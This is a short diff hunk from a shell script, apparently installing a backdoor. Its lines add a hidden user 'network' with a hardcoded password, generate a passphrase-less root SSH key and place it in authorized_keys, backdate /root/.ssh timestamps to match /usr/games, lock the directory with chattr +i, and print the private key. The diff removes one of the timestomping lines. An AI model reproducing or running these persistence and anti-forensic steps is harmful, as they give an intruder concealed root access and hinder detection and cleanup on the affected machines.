@@ -104,7 +104,6 @@ sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01
 ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
 cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
 find /root/.ssh -exec touch -r /usr/games {} \;
-find /root/.ssh/.. -exec touch -r /usr/games {} \;
 chattr +i -R /root/.ssh
 cat /root/.ssh/id_rsa
 
